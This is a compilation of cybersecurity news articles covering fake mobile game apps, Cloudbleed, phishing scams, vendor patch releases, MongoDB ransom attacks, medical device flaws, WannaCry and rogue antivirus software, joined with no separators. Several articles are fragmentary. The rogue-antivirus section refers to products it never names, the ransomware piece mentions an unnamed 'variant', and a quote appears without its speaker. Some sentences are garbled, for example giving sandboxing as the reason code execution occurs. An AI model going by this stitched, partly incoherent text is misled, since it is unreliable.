The game is finally Google Play Store official, but its actual release date is yet unknown, and this eagerness is being exploited by criminals.
Super Mario Run for iOS Released
Nintendo's first official Mario game on mobile was first launched for all iOS devices before Christmas, which has already been downloaded by millions of users and has reached the top 10, despite its $9.99 price tag.
However, the game is yet to be launched for Android users, and this gap is getting used well by cyber criminals, as reported by The Express.
Warnings on Fake Super Mario Android Apps
Recent warnings have been given by security experts for Android users that they should be aware of the apps that falsely claim to be the Super Mario Run for their device.
However, such fake downloads end up uncovering an actual mountain of malware instead of the game.
Trend Micro Findings on Malicious Apps
Security Firm Trend Micro's Researchers have recently found an increasing count of fake Super Mario Run Android apps that claim as the trending game Super Mario Run or other content related to it.
Also, some of the apps even made users install unwanted apps in user's device.
For example one of the apps had an emulated version of the original Super Mario Bros game.
However, it was filled with pop-ups and banner apps when the user tried downloading the app, said Trend Micro.

Having had more than a week to digest Cloudbleed’s causes and impact, Cloudflare CEO Matthew Prince assessed the damage yesterday in a lengthy post-mortem as relatively low.
Prince said there is no evidence the vulnerability, which leaked customer data from memory, was exploited by attackers.
The bug, however, was triggered more than 1.2 million times from 6,500 sites that met the criteria under which it could be exploited.
In the meantime, Cloudflare continues to work with Google and other search engine providers to scrub cached sites that could contain any leaked data from memory.
“We’ve successfully removed more than 80,000 unique cached pages.
That underestimates the total number because we’ve requested search engines purge and recrawl entire sites in some instances,” Prince said.
Prince said leaks have included internal Cloudflare headers and customer cookies, but no evidence of passwords, encryption keys, payment card data or health records among the leaks.
The vulnerability was privately disclosed Feb 17 by Google Project Zero researcher Tavis Ormandy, who reported that he did see crypto keys, passwords, POST data and HTTPS requests for other Cloudflare-hosted sites among data from other requests.
Ormandy initially said in a tweet that Cloudflare was leaking customer HTTPS sessions for Uber, FitBit, OKCupid and others, all of which said the impact of Cloudbleed on their data was minimal.
“While the bug was very bad and had the potential to be much worse,” Prince said.
Prince explained that the bug was triggered only when a webpage moving through the Cloudflare network contained HTML ending with an un-terminated attribute, and if a number of Cloudflare features were turned on.
Those features hand in hand with a Cloudflare stream parser used to scan and modify content in real time such as rewriting HTTP links to HTTPS—a feature called Automatic HTTPS Rewrites—or hiding email addresses on a page from spammers—a feature called Email Address Obfuscation.
The need to end with an un-terminated attribute was key.
“When a page for a particular customer is being parsed it is stored in memory on one of the servers that is a part of our infrastructure.
Contents of the other customers’ requests are also in adjacent portions of memory on Cloudflare’s servers,” Prince said.
“The bug caused the parser, when it encountered un-terminated attribute at the end of a page, to not stop when it reached the end of the portion of memory for the particular page being parsed.
Instead, the parser continued to read from adjacent memory, which contained data from other customers’ requests.
The contents of that adjacent memory were then dumped onto the page with the flawed HTML”.
Anyone accessing one of those pages would see the memory dump, looking a lot like random text, below, Prince said.
An attacker would need to pound one of those sites with numerous requests to trigger the bug and then record the results, getting a mix of useless data and sensitive information, Prince said.
“The nightmare scenario we have been worried about is if a hacker had been aware of the bug and had been quietly mining data before we were notified by Google’s Project Zero team and were able to patch it,” Prince said.
“For the last 12 days we’ve been reviewing our logs to see if there’s any evidence to indicate that a hacker was exploiting the bug before it was patched.
We’ve found nothing so far to indicate that was the case”.
Prince said Cloudflare customers who find any leaked cached data can send a link to the caches to parserbug@cloudflare[.]com.

NETFLIX users are once again being warned not to fall for fake emails asking customers to update their payment details.
The emails claim to be from the streaming service but are actually from scammers trying to steal your money.
The convincing message reads: ""We're having some trouble with your current billing information.
""We'll try again, but in the meantime you may want to update your payment details.""
At the end of the email, there is a red button that tells you to ""Update Account now"".
But if you click on it and follow the link, you will be taken to a fake website that is actually run by scammers who may use the information you enter to hack your bank account.
The Federal Trade Commission, a government agency in the US, has now issued an urgent warning about the Netflix ""phishing scam"" and urged consumers not ""take the bait"".
""Scammers use your information to steal your money, your identity, or both,"" it explained.
""They also use phishing emails to get access to your computer or network.
""If you click on a link, they can install ransomware or other programs that can lock you out of your data.""
But it's not the first time warnings have been issued over Netflix scams - in September this year Action Fraud did the same over a similar scam.

Overall, the chip giant patched five vulnerabilities across an array of its products.
Intel on Tuesday patched three high-severity vulnerabilities that could allow the escalation of privileges across an array of products. Overall, the chip giant fixed five bugs – three rated high-severity, and two medium-severity.
The most concerning of these bugs is an escalation-of-privilege glitch in Intel’s PROset/Wireless Wi-Fi software, which is its wireless connection management tool. The vulnerability, CVE-2018-12177, has a “high” CVSS score of 7.8, according to Intel’s update.
“Intel is releasing software updates to mitigate this potential vulnerability,” it said, urging users to update to version 20.90.0.7 or later of the software.
The vulnerability, reported by Thomas Hibbert of Insomnia Security, stems from improper directory permissions plaguing the software’s ZeroConfig service in versions before 20.90.0.7. The issue could allow an authorized user to potentially enable escalation of privilege via local access.
The other high-severity bug exists in the company’s System Support Utility for Windows, which offers support for Intel-packed Windows device users.
This bug (CVE-2019-0088) is due to insufficient path checking in the support utility, allowing an already-authenticated user to potentially gain escalation of privilege via local access. The vulnerability has a CVSS score of 7.5.
Versions of System Support Utility for Windows before 2.5.0.15 are impacted; Intel recommends users update to versions 2.5.0.15 or later. Independent security researcher Alec Blance was credited with discovering the flaw.
The chip-maker also patched a high-severity and medium-severity flaw in its Software Guard Extensions (SGX) platform and software, which help application developers to protect select code and data from disclosure or modification.
“Multiple potential security vulnerabilities in Intel SGX SDK and Intel SGX Platform Software may allow escalation of privilege or information disclosure,” said Intel.
The high-severity flaw in SGX (CVE-2018-18098) has a CVSS score of 7.5 and could allow an attacker with local access to gain escalated privileges. The vulnerability is rooted in improper file verification in the install routine for Intel’s SGX SDK and Platform Software for Windows before 2.2.100.  It was discovered by researcher Saif Allah ben Massaoud.
Another vulnerability in the platform (CVE-2018-12155) is only medium in severity, but could allow an unprivileged user to cause information disclosure via local access. That’s due to data leakage in the cryptographic libraries of the SGX platform’s Integrated Performance Primitives, a function that provides developers with building blocks for image and data processing.
And finally, a medium escalation of privilege vulnerability in Intel’s SSD data-center tool for Windows has been patched.
“Improper directory permissions in the installer for the Intel SSD Data Center Tool for Windows before v3.0.17 may allow authenticated users to potentially enable an escalation of privilege via local access,” said Intel’s update. The company recommends users update to v3.0.17 or later.
Intel’s patch comes during a busy patch Tuesday week, which includes fixes from Adobe and Microsoft.

Security researchers report a massive uptick in the number of MongoDB databases hijacked and held for ransom.
That’s sharp increase from last week when 2,000 MongoDB had been hijacked by two or three criminals.
A wave attacks was first spotted on Dec. 27 by Victor Gevers, an ethical hacker and founder of GDI Foundation.
That’s when he said a hacker going by the handle “Harak1r1” was compromising open MongoDB installations, deleting their contents, and leaving behind a ransom note demanding 0.2 BTC (about $220).
Victims would discover they were hit with the data theft only when they accessed the MongoDB and came across a top database field with the ransom demand that read, “Contact this email with your IP of your server to recover your database”.
Escalation of the attacks happened fast jumping from 200 14 days ago to 2,000 the following week.
On Friday the numbers were at 10,000, and by Monday Merrigan said there was a huge spike in attacks via his Twitter account reporting 27,000 servers compromised representing 93 terabytes of data gone.
Since identifying “Harak1r1” as the original attacker, they say more than a dozen additional hackers are now actively targeting MongoDB installations as well.
Researchers said that in many cases, data stored in the MongoDB now is simply being destroyed and when victims pay the ransom they do not receive their data back.
Last week, Gevers told Threatpost attackers were battling among themselves.
He said, when one hacker would leave a ransom note, another hacker would target the same database, delete the original ransom note and leave their own.
This further complicates a victim’s ability to retrieve data even if a ransom is paid, he said.

The FDA confirmed that  St.Jude Medical's implantable cardiac devices have vulnerabilities that could allow a hacker to access a device.
Once in, they could deplete the battery or administer incorrect pacing or shocks, the FDA said on Monday.
The devices, like pacemakers and defibrillators, are used to monitor and control patients' heart functions and prevent heart attacks.
St. Jude has developed a software patch to fix the vulnerabilities, and it will automatically be applied to affected devices beginning Monday.
To receive the patch, the Merlin@home Transmitter must be plugged in and connected to the Merlin.net network.
The FDA said patients can continue to use the devices, and no patients were harmed as a result of the vulnerabilities.
Abbott Laboratories (ABT), which recently acquired St. Jude in a deal worth $25 billion, said it has worked with the FDA and DHS to update and improve the security of the affected devices.
""Cybersecurity, including device security, is an industry-wide challenge and all implanted devices with remote monitoring have potential vulnerabilities,"" Candace Steele Flippin, a spokeswoman for Abbott, told CNNMoney in an email.
""As we've been doing for years, we will continue to actively address cybersecurity risks and potential vulnerabilities and enhance our systems.""
The FDA said hackers could control a device by accessing its transmitter.
In August 2016, Muddy Waters founder Carson Block published a report claiming St. Jude's devices could be hacked and said he was shorting the stock.
St. Jude said the claims were ""absolutely untrue,"" and in September, it filed a lawsuit against the firm.
In a statement, Block said Monday's announcement ""vindicates"" the firm's research.
""It also reaffirms our belief that had we not gone public, St. Jude would not have remediated the vulnerabilities,"" Block said.
""Regardless, the announced fixes do not appear to address many of the larger problems, including the existence of a universal code that could allow hackers to control the implants.""
The confirmation of St. Jude's vulnerabilities is the latest reminder of how internet-connected devices can put health at risk.
In December, the FDA published guidance for manufacturers on how to proactively address cybersecurity risks.

Malware tricks users into opening Android Accessibility menu, enabling the attacker to mimic users' clicks and select anything displayed on their screen.
The Android Trojan can mimic the user's clicks and actions.
A new form of Trojan malware targeting Android smartphones is duping victims into downloading a fake security update for Adobe Flash Player, which then makes them even more susceptible to malicious software.
The malware is ultimately designed to monitor the users' activity for the purposes of stealing data, mimicking their actions in order to generate funds from fraudulent adware installations, and enabling the installation of various other types of malware --  including ransomware.
Detected by researchers at security company ESET, the Trojan malware targets all versions of Google's mobile operating system and aims to trick victims into granting it special permissions which it uses to download additional malware.
Users should also be wary of apps which appear to ask for many more permissions then they might need.
For those who've already fallen victim to this malware, they can attempt to remove the malware by manually uninstalling the 'Flash-Player' app from their phone.
However, more work may need to be done to completely remove malicious software from the device.

Oracle is advising customers to update their database software following the discovery and disclosure of a critical remote code execution vulnerability.
The flaw, dubbed CVE-2018-3110 was given a CVSS base score of 9.9 (out of 10) and Oracle warns that successful exploit of the bug ""can result in complete compromise of the Oracle Database and shell access to the underlying server.""
""Due to the nature of this vulnerability, Oracle strongly recommends that customers take action without delay,"" Oracle says.
Vulnerable versions of Database Server include 11.2.0.4, 12.1.0.2, 12.2.0.1, and 18. Admins are advised to install Oracle's update as soon as possible. No credit was given for discovery or reporting.
The flaw itself is found in the JavaVM component of Oracle Database Server and is not considered a remote code exploit flaw, as it requires the attacker have a connection to the server via Oracle Net, the protocol Oracle servers use to connect with client applications. Other than that, however, there is little else required for a successful attack that gives complete control over the host server.
The Oracle patch will only pile on to what is going to be a busy week for IT departments and administrators.
In addition to this fix, Microsoft is releasing its monthly Patch Tuesday security update for Windows, Office, and Internet Explorer/Edge today, and Adobe has posted fixes for security holes in Flash Player, Acrobat/Reader, Creative Cloud, and Experience manager.
Our advice is to keep a pot of coffee handy and reserve a table at the pub for when this is all over with.

Back in August we wrote about a security bugfix for Mikrotik routers that was reverse engineered and turned into a working exploit.
Indeed, patches that fix security vulnerabilities often end up giving away enough about the vulnerability that both good guys and bad guys alike can weaponise it from first principles – all without having to figure out the vulnerability in the first place.
In the August 2018 case, dubbed CVE-2018-14847, a crook could trick an unpatched Microtik router into coughing up the contents of any file on the device, including the password file.
Worse still, the password file included plaintext passwords, with no salting, hashing or stretching, meaning that a security bypass bug could be parlayed into a credential compromise.

The perils of late patching
What we didn’t know back then was that security researchers at Tenable had responsibly disclosed another bunch of Mikrotik router bugs at about the same time.
These bugs were serious – indeed, one of them allows a attacker to run any program of their choosing, just by making a web request to the router.
This sort of hole is known, for rather obvious reasons, as an RCE, short for Remote Code Execution.
Tenable’s bugs, however, were what’s known as “authenticated vulnerabilities”, meaning that you had to be logged in first in order to be able to exploit them.
Security holes that require pre-authentication may seem harmless at first sight – after all, if you already have a username and password, or some other access token, that gives you access to a system…
…well, you’re already in, so it sounds as though breaking in again can be dismissed as an irrelevancy.
The good news is that Mikrotik has already patched Tenable’s now-disclosed bugs, dubbed CVE-2018-1156, -1157, -1158 and -1159.
Make sure you have the latest Mikrotik firmware updates, which are: 6.40.9, 6.42.7 or 6.43, depending on whether you’re using the current, previous or pre-previous version.
If you’re a Mikrotik user, skipping the latest patch leaves you at risk, but if you still haven’t applied the previous patch, you’re in double trouble.
With both patches missing, you’re open to an unauthenticated password disclosure bug that could then be chained with the newer authenticated remote code execution bug.
In other words, instead of anyone being able to get some access, or some people being able to get full access, anyone could get full access by pivoting from CVE-2018-14847 to CVE-2018-1156, the RCE flaw.

The National Security Agency warned Microsoft about a vulnerability in Windows after a hacker group began to leak hacking tools used by the agency online, the Washington Post reported late Tuesday. 
The vulnerability has been the center of attention in recent days, following the outbreak of the global “Wanna Cry” ransomware attack that crippled Britain’s hospital system and has spread to at least 150 countries.
The ransomware is widely believed to be based on an alleged NSA hacking tool leaked by the group Shadow Brokers earlier this year. The government has not publicly acknowledged that the NSA developed the tool.
“NSA identified a risk and communicated it to Microsoft, who put out an immediate patch,” Mike McNerney, a former Defense Department cybersecurity official, told the Post. McNerney said, however, that no top government official emphasized the seriousness of the vulnerability.
Microsoft issued a patch for its supported systems in March, weeks before Shadow Brokers released the exploit, but many computer systems around the world remained unpatched, leaving them vulnerable to the latest ransomware attack.
The ransomware campaign has been less devastating to the United States than other countries, but has affected some American companies including FedEx.
The events have renewed debate over the secretive process by which the federal government decides whether to disclose a zero-day vulnerability to the product’s manufacturer, as well as spurring scrutiny of the NSA.
Microsoft president and chief legal officer Brad Smith said Sunday that the ransomware attack should serve as a “wake-up call” to governments not to hoard vulnerabilities.
On Wednesday, a bipartisan group of lawmakers introduced legislation that would codify what is known as the vulnerabilities equities process into law, bringing more transparency and oversight to it.

In this day and age of online attacks, it becomes all the more important to protect one’s computer and other devices against the various threats.
Criminals often try to bypass existing security solutions on the device in question, but they also distribute fake tools that allegedly prevent these attacks from happening.
This trend is called “rogue security software,” and has been proven to be quite successful over the past few years.
This rogue anti-spyware program is a clone of  the Total Virus Protection malware whose origin points to the Russian Federation.
The software offers you an option to purchase a license in order to remove those programs when in fact the “infections” are critical system files.
Many more clones of this software exist, and 2017 variants have been spotted in the wild already.
ANG Antivirus only targets Microsoft Windows users, the good news is that it is not too harmful because it’s main goal is to scare you into buying a software license.
However, some variants have proven to be more harmful and may even steal sensitive user information.
Do not confuse this “tool” with the official Microsoft Security Essentials software, as they are nothing alike.
Security Essentials 2010 is a malware strain first discovered in February of 2010.
Its most powerful threat is how the malware prevents users from launching over 150 different programs, including most browsers and the Windows Command Prompt.
Unlike ANG Antivirus, Security Essentials uses 3rd party trojans that disguise themselves as flash updates that are required to view online videos.
Once baited, the trojan will install a number of malware including Security Essentials 2010.
Similar to the previous scareware, this one will also prompt you to purchase a license to supposedly remove quite a few threats, all of which are obviously fake.
Thankfully, this malware has not been reported of stealing personal information or any more sensitive info and is no longer an active threat.
The funny part about this program is that it started as a legitimate anti-spam system that tried to automate the complaint process for email spam.
The program would allow for a user to send a complaint about a spam email to the software.
However, some say that the program collected the list of emails in order to sell it to other spammers as a fresh list of targets.
It did not take long for this security tool to get shut down completely, which occurred in May of 2006.
The company bailed after a thread popped up on a security forum accusing Blue Security of initiating a massive spam attack on it’s users, Blue Frog was gone one week later.
Macintosh users are also in need of proper security tools to keep their computer safe from harm.
Mac Defender tried to fill this need, even though its developers had less honorable intentions.
It was the first major malware threat to MacOS, its object was to trick users into paying the license fee, ranging between US$59 and US$79.
Moreover, the malware collected payment card information used for the license and would use that for further fraudulent purposes.
Do not be fooled into thinking this is a software tool that will keep a computer safe from spyware.
Instead, the Zinaps software wants to perform fake computer scans and trick users into buying a license.
This is a very common theme among rogue security software, as most developers hope to make a lot of money by tempting users into paying for their useless creations.
What makes this malware so dangerous is that Zinaps would edit the Windows Registry, ensuring the software runs as soon as the computer boots up.
It also makes removing the software much harder and almost almost always leaves traces after its gone.
This scareware rogue security program will not fix any issues related to Windows or otherwise.
Once again, this malware wants to force users to buy a license, while not offering any help with real security issues whatsoever.

Security researchers are closely investigating a spate of newly discovered data breaches in the Middle East, in which each case involved the deployment of an advanced, disk-wiping malware variant.
Reports from Symantec suggest that a series of recent intrusions share some similarities with an infamous 2012 hacking operation that disrupted multiple Saudi energy companies.
The mysterious perpetrators behind the destructive 2012 cyberattacks were dubbed Shamoon, a loosely defined hacking group with advanced capabilities.
The malware once used by the enigmatic group — W32.Disttrack and W32.Disttrack.B — first showed up in the 2012 incident but was then again found by digital forensic experts as recently as Nov. 2016.
When successfully installed, Disttrack can corrupt files and overwrite a system’s master boot record, rendering the device unusable.
“Threats with such destructive payloads are unusual and are not typical of targeted attacks,” security researchers wrote in a blog post shortly after the originally Saudi energy breach.
On Monday, Symantec published what it believes are ties between Shamoon and another cyber espionage group, named Greenbug.
Greenbug relies on a unique, custom information-stealing remote access trojan, or RAT, known as Trojan.Ismdoor, in addition to a suite of commoditized credentials stealing hacking tools.
Greenbug tends to use phishing emails to infect victims.
The group typically targets Middle Eastern aviation, government, investment and education organizations, Symantec’s research team said.
Between June and November 2016, Trojan.Ismdoor was used against multiple organizations based in the Middle East.
“The use and purpose [of Trojan.Ismdoor] do fit that of malware used by nation state attackers.
Additionally, the information gathering conducted once the attacker is on the network also supports the types of operations seen by nation state attackers,” Symantec senior threat intelligence analyst Jon DiMaggio told CyberScoop.
Researchers say there is at least one case in which the two hacking groups — Shamoon and Greenbug — may have been simultaneously active inside a victim’s computer network.
In this context, it is possible that Greenbug — acting as the espionage arm for Shamoon — collects the necessary information needed to conduct the disk-wiping attack.

In the past weeks, information-stealing malware EyePyramid made headlines after it was used to steal 87GB of sensitive data from government offices, private companies and public organizations.
More than 100 email domains and 18,000 email accounts were targeted, including those of high-profile victims in Italy, the U.S., Japan and Europe.
The natural assumption for many would be that EyePyramid was a state-sponsored cyberespionage campaign.
It was ultimately attributed to a brother-sister team who used the malware for profit.
Playing Whodunit is Hard
If there’s anything EyePyramid can valuably teach us, it’s that playing whodunit is hard.
Attribution is one of the most complicated aspects in cybersecurity.
It’s partly because of the Internet’s underlying architecture and the many ways perpetrators can cover their tracks.
While we can attribute cyberattacks to certain threat actors, most threat researchers and information security professionals are cautious and often avoid attributing them to a specific person, group, or country.

Microsoft’s updates for the Meltdown microprocessor mega-flaw inadvertently left users running Windows 7 64-bit systems open to a “way worse” flaw, a researcher has claimed.
To recap, Meltdown (aka F**CKWIT or CVE-2017-5754) is a proof-of-concept hardware vulnerability uncovered almost simultaneously by several groups of researchers through which an attacker could access the contents of kernel memory (passwords, encryption keys, say) from the part used by ordinary applications.
An extremely inviting target for any attacker, which is why Microsoft sprang into action to mitigate the vulnerability (in addition to BIOS updates from vendors) across different Windows versions in two rounds of updates in January and February.
But according to Ulf Frisk, something went awry starting with the January update when applied to Windows 7 and Windows Server 2008 R2, which miss-set controlling permissions for something called the Page Map Level 4 (PML4).
This is a table used by Intel microprocessors to “translate the virtual addresses of a process into physical memory addresses in RAM.”
Set correctly, only the kernel should be able to access this table. The result of the issue is that an attacker aware of the flaw would have the ability to break out of the application space and take over a system.
All this from a simple software mistake:
    No fancy exploits were needed. Windows 7 already did the hard work of mapping in the required memory into every running process. Exploitation was just a matter of read and write to already mapped in-process virtual memory. No fancy APIs or syscalls required – just standard read and write!

GreatHorn analyzed more than 56 million emails from 91,500 corporate mailboxes from March to November 2016.
The data found that display name spoofs are the clear phishing weapon of choice for cybercriminals.
Attackers are increasingly relying on highly targeted, non-payload attacks that exploit trust and leverage pressure tactics to trick users into taking action that will put their organizations at risk.
Of the more than 537,000 phishing threats GreatHorn detected in its research, 91 percent (490,557) contained characteristics of display name spoofs.
Display name spoofs impersonate a person familiar to a business user in order to fool the recipient into thinking that the message came from a trusted source.
It’s an extremely effective tactic against a workforce deluged with incoming communications all day, every day.
Direct spoofs were the second most popular attack type (8 percent), and domain lookalikes made up less than 1 percent of phishing attacks.
“Stopping spear phishing attacks isn’t as simple as pushing a button; the sheer volume of these attacks, coupled with the size of the attacks surface and security resource constraints, makes it impossible to mitigate risk solely via human intervention, no matter how much you try to train your end users,” said GreatHorn CEO Kevin O’Brien.

Criminals are still trying to shake down users of the Ashley Madison dating/cheating online service.
As you might remember, the service was hacked in 2015, and the attackers stole sensitive personal and financial data of 37 million users, and later dumped it online. 
Since then, cyber criminals have been attempting to monetize this data by sending emails to users whose info they found in the dump, threatening to reveal all of it to the target’s nearest and dearest, and asking for money in exchange for silence.
The emails generally contain some of the target’s personal data as to make the threat believable, and often claims that the attackers have found the target’s Facebook account and, therefore, have the means to contact their friends, family, and employer.
In this latest round of blackmail attempts, they are threatening to set up a site and publish all the stolen information.
“On May 1 2017 we are launching our new site – Cheaters Gallery – exposing those who cheat and destroy families. We will launch the site with a big email to all the friends and family of cheaters taken from Facebook, LinkedIn and other social sites. This will include you if do not pay to opting out,” the email says, as noted by ZDNet’s Robin Harris, who received one. 
The extortionists are asking for some $500 (in Bitcoin).
It’s impossible to tell whether these crooks are the same ones that mounted previous email blackmail attempts. What is definitely obvious is that they are betting on there still being some users with too much to lose if the information gets out.
Harris did not share the contents of the email he received, but recipients can be sure that if their Facebook or other social media account isn’t specified in it, the blackmailers haven’t actually connected the two accounts.
More likely than not, they have simply written a script that takes specific info from the Ashley Madison data dump, inserts it in a template email, and fires these emails off to as many recipients as possible.

Adobe's scheduled October update for its Acrobat and Reader PDF software addresses 85 vulnerabilities, including dozens of critical flaws that allow arbitrary code execution.
The patches also address multiple privilege-escalation and information-disclosure flaws, shoring up Adobe's PDF software further following a patch for a critical Acrobat and Reader flaw plugged two weeks ago.
The bugs affect Acrobat DC and Reader versions 2018.011.20063 and earlier from Adobe's continuous track, Acrobat 2017 and Acrobat Reader 2017 2017.011.30102, and Acrobat DC and Reader DC versions 2015.006.30452 and earlier from Adobe's classic 2015 track.
The flaws affect the software running on Windows and macOS systems.
This update is the largest set of fixes Adobe's PDF software since it swatted 105 vulnerabilities in July. However, fortunately the company says it is not currently aware of any exploits in the wild for bugs fixed in this update.
Users and admins nonetheless should install fixed versions, according to Adobe, because if an attacker developed an exploit it could lead to arbitrary code execution in the context of the current user because the software is sandboxed.
Since PDFs are still widely used in the enterprise, hackers continue to develop new techniques to break the sandbox by combining PDF attacks with operating system flaws.
This happened earlier this year, prompting a warning from Adobe in May after it was informed by researchers at ESET and Microsoft that they'd discovered a malicious PDF using a zero-day remote code execution flaw in Reader with a sandbox-busting Windows privilege escalation flaw.
Adobe credits researchers from Qihoo 360, Cisco Talos, Beihang University, Palo Alto Networks, and Check Point for reporting flaws patched in the October update.
Check Point researcher Omri Herscovici was responsible for reporting 35 of this month's bugs, all of which were information disclosure flaws.

EdgeWave, Inc.®, a leading provider in cybersecurity and compliance, today revealed a new, malicious exploit embedded in popular URL shorteners, which are being mistaken as legitimate URLs.
URL shorteners may be susceptible to this new exploit when a change is allowed to the long URL after the shortened URL is created. The malicious parties fabricate an email that appears to be a legitimate marketing email which includes the shortened URL --- passing by any in-transit virus scanning and potentially other spam checking tools.
""Several days ago, we detected this new exploit while performing our real-time, human analysis on spam campaigns,"" said Blake Tullysmith, Principal Engineer at EdgeWave. ""With over 100 million URLs being shortened per day, this new exploit can potentially impact billions of users across email and social media campaigns.""
Here is how the EdgeWave ePrism team explains the exploit:
Some URL shorteners will allow users to change the long URL after they have already created the shortened URL. The malicious parties will then fabricate a seemingly legitimate email and include a shortened URL that passes in-transit virus scanning as well as other filtering solutions, which will allow the shortened URL to be delivered right into the inbox. Once the spam campaign is embedded in the message, the URL is redirected to a site that contains malicious content like a virus or malware. However, the delivered message is already in the inbox; so unfortunately, there is no protection at this point.
Attached is an image of a sample email message extracted from an email campaign while in-transit with a link from http://tiny.cc pointing to a clean website. After the campaign was delivered, it points to a compromised website including malicious content.
The EdgeWave team is still conducting further investigations on this exploit and recommends all URL shortening users utilize services that do not allow the URL to be edited after its creation. EdgeWave customers are being protected by its ePrism Email Security solution.
EdgeWave ePrism is an award-winning, hosted cloud email security solution with Zero-Minute Defense against phishing, spam and malware campaigns using our unique combination of automated intelligence and 24/7/365 human analysis in a simple-to-use security suite for all email compliance and business needs.

At last count, 110 organizations have reported successful Phishing attacks targeting W-2 records, placing more than 120,000 taxpayers at risk for identity fraud.
Many of those working for the victimized firms have had a stressful time dealing with the fallout.
Those who have experienced this unique type of crime say it's a nightmare.
Some of those affected have had fraudulent returns filed under their name, in addition to issues with educational expenses.
In one case, the scammers created flexible spending accounts with their stolen identities.
The Phishing attacks causing so much damage, also known as BEC (Business Email Compromise) attacks, are simple and effective.
They exploit trust relationships within the office, and in many cases, exploit the routine practice of sharing data via email.
According to the IRS, these attacks are some of the most dangerous email scams the agency has seen in a long time.
""It can result in the large-scale theft of sensitive data that criminals can use to commit various crimes, including filing fraudulent tax returns.
We need everyone’s help to turn the tide against this scheme,"" IRS Commissioner, John Koskinen, remarked in a warning issued last month.

Microsoft published earlier today the Patch Tuesday security bulletin for May 2018, containing fixes for 67 security issues.
This month, Microsoft fixed security flaws in Microsoft Windows, Internet Explorer, Microsoft Edge, ChakraCore, .NET Framework, Microsoft Exchange Server, Windows Host Compute Service Shim, and Microsoft Office and Microsoft Office Services and Web Apps.

Microsoft patches two zero-days
The biggest issue patched this month is a zero-day in Internet Explorer that has been abused by a cyber-espionage campaign earlier this month. The zero-day (CVE-2018-8174) affects not only IE but also any other projects that embed the IE web rendering engine. Microsoft credited researchers from both Qihoo 360 Core Security and Kaspersky Lab for discovering this issue.
The second zero-day is CVE-2018-8120, an elevation-of-privilege vulnerability in the Win32k component.
""An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights,"" Microsoft says. But the flaw is not as dangerous as it sounds, as an attacker already needs a foothold on Windows systems to run his malicious code in the first place, to elevate his access rights.
Microsoft also patched CVE-2018-8141 (Windows Kernel Information Disclosure Vulnerability) and CVE-2018-8170 (Windows Image Elevation of Privilege Vulnerability), for which exploitation details became public. Despite info about these two flaws being published online, Microsoft says none were exploited in the wild.

A cybersecurity firm said that the recent WannaCry ransomware attacks may be connected to the group that orchestrated one of the biggest cyberheists in history that involved a Philippine bank.
Kaspersky Lab, a cybersecurity and antivirus provider in Moscow, said in a statement that a security researcher at Google found an “artifact” on Twitter potentially linking the WannaCry ransomware attacks that hit organizations and individuals in several dozen countries and the Lazarus hacking group which was responsible for several devastating cyberattacks on government organizations, media firms and financial institutions in recent years.
“On Monday, May 15, a security researcher from Google posted an artifact on Twitter potentially pointing at a connection between the WannaCry ransomware attacks that recently hit thousands of organizations and private users around the world, and the malware attributed to the infamous Lazarus hacking group, responsible for a series of devastating attacks against government organizations, media and financial institutions,” Kaspersky said.
Late last week, a worm dubbed WannaCry locked up more than 200,000 computers in more than 150 countries, disrupting operations of car factories, hospitals, shops, schools and other institutions.
The attack on late Friday was slowed down after a security researcher took control of a server linked to the attack, crippling its ability to rapidly spread across the world.
The Lazarus group meanwhile has been linked to several large-scale operations such as the attacks against Sony Pictures in 2014 and a series of similar attacks that continued until 2017.
One of the biggest attacks carried out by the Lazarus group was the Central Bank of Bangladesh heist in 2016, one of the biggest in history.
In that operation, hackers sent fraudulent messages that were made to appear to be from the Bangladeshi central bank to transfer $1 billion from its account in the Federal Reserve of New York.
Most of the transfers were blocked but about $81 million was sent to RCBC in the Philippines.
The money was moved around to make it difficult to trace.
Kaspersky said that the Google researcher pointed at a WannaCry malware sample which appeared in February 2017, weeks before the late Friday attack.
Based on the analysis of Kaspersky researchers, it was confirmed that there was “clear code similarities” between the sample highlighted by the Google expert and the malware samples used by the Lazarus group in their 2015 attacks.
Kaspersky however admitted that the similarities might be a false flag although another analysis of the February and WannaCry samples used in the recent operation showed that the code which could point at the Lazarus group was removed from the malware.
Kasperksy said that this could be an attempt to cover the traces of the perpetrators of the WannaCry operations.
“Although this similarity alone doesn't allow proof of a strong connection between the WannaCry ransomware and the Lazarus Group, it can potentially lead to new ones which would shed light on the WannaCry origin which to the moment remains a mystery,” Kaspersky said.

The two vulnerabilities are critical remote code execution flaws that exist in Adobe Photoshop CC.
Adobe hurried out unscheduled patches today for two critical flaws that could enable remote code-execution in Photoshop CC.
The patches impact two memory corruption vulnerabilities in Adobe Photoshop products, including Photoshop CC 2018 (v 19.1.6) and Photoshop CC 2017 (v 18.1.6), both for Windows and macOS. The release comes only a week after the company fixed a slew of glitches last Patch Tuesday.
“Adobe has released updates for Photoshop CC for Windows and macOS,” the company said in a Wednesday security bulletin. “These updates resolve critical vulnerabilities in Photoshop CC 19.1.5 and earlier 19.x versions, as well as 18.1.5 and earlier 18.x versions.  Successful exploitation could lead to arbitrary code-execution in the context of the current user.”
Both vulnerabilities (CVE-2018-12810) and (CVE-2018-12811) are critical remote code-execution flaws, according to the advisory, but further details around both flaws are not available.
Kushal Arvind Shah of Fortinet’s FortiGuard Labs was credited with reporting the two flaws.
Adobe said impacted users need to apply the fixes to the affected versions of Photoshop by updating to version 19.1.6 (via the applications’ update mechanism).
Last week, Adobe released 11 total fixes for an array of products, including two critical patches for Acrobat and Reader for Windows and macOS. Exploitation of those two vulnerabilities could lead to arbitrary code execution in the context of the current user.
Adobe said in an email that it is not aware of any exploits in the wild for the flaws. The update is a priority 3 in severity, meaning that it resolves vulnerabilities in a product that has historically not been a target for attackers, according to the company’s ranking system.
In this case I would expect there may have been a disclosure deadline and the release did not make this month’s typical release cycle but needed to release before September’s release cycle.”

It’s safe to say that 2016 was the year of ransomware.
More specifically, the year of crypto-ransomware, that nefarious variant that encrypts files and holds them captive until a ransom is paid.
Since the release of Cryptolocker in late 2013, crypto-ransomware has exploded, and 2016 was a banner year.
As a matter of fact, according to the FBI, cyber criminals used ransomware to steal more than $209 million from U.S. businesses in just the first quarter of 2016.
And according to a recent report from Kaspersky Labs, from January to September of 2016, ransomware attacks targeting companies increased by a whopping 300 percent.
With threat actors realizing ransomware’s lucrative potential, they bombarded the industry with new attacks in 2016.
This variant hit the wild in early 2016, infecting systems using AES encryption.
It not only infects mapped file shares, but any networked share, so remote drives are at risk.
